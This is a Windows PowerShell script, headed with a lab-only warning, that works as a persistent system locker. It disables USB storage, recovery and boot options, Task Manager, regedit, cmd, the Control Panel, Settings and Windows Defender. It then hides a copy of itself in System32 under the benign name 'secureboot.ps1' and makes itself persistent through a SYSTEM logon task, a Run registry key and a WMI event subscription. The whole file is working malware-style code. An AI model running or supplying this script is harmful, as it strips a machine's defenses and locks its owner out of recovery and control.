# ⚠️ Use only in a VM / ethical lab - Dangerous and persistent!
# Run as Administrator!

# --- DISABLE USB & BOOT OPTIONS ---
reg add "HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR" /v Start /t REG_DWORD /d 4 /f
bcdedit /set {current} recoveryenabled No
bcdedit /set {current} advancedoptions false
bcdedit /set {current} bootstatuspolicy IgnoreAllFailures
bcdedit /set {globalsettings} preventbootfromnetwork on
bcdedit /set {globalsettings} preventbootfromexternalmedia on

# --- DISABLE BIOS/UEFI ACCESS ---
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableFirmwareUI /t REG_DWORD /d 1 /f

# --- DISABLE TASK MANAGER, REGEDIT, CMD ---
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f

# --- DISABLE SHIFT+RESTART AND CONTROL PANEL ---
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableLogonShiftRestart /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

# --- DISABLE SETTINGS ACCESS ---
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v SettingsPageVisibility /t REG_SZ /d "hide:*" /f

# --- DISABLE WINDOWS DEFENDER ---
Try {
    Set-MpPreference -DisableRealtimeMonitoring $true -Force
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
} Catch {}

reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# --- PERSISTENCE: COPY TO SYSTEM32 AND HIDE ---
$scriptPath = "C:\Windows\System32\secureboot.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
attrib +h +s $scriptPath

# --- PERSISTENCE: TASK SCHEDULER (SYSTEM LOGON) ---
$taskName = "SecureBootLock"
schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onlogon /ru SYSTEM /f

# --- OPTIONAL: PERSISTENCE VIA REGISTRY RUN KEY ---
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SecureBootLock /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" /f

# --- OPTIONAL: WMI PERSISTENCE (Highly stealthy) ---
$filterName = "SecureBootWMI"
$consumerName = "SecureBootConsumer"
$wmiQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_ComputerSystem'"
$scriptBlock = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""

# Create WMI Event Filter
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.Name = $filterName
$filter.Query = $wmiQuery
$filter.QueryLanguage = "WQL"
$filter.EventNamespace = "root\CIMV2"
$filter.Put()

# Create WMI Event Consumer
$consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$consumer.Name = $consumerName
$consumer.CommandLineTemplate = $scriptBlock
$consumer.Put()

# Bind filter and consumer
$binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$binding.Filter = $filter.Path.RelativePath
$binding.Consumer = $consumer.Path.RelativePath
$binding.Put()

# --- DONE ---
Write-Host "`n[✔] BIOS-style system lockdown complete."
Write-Host "    > Reboot required to take full effect."
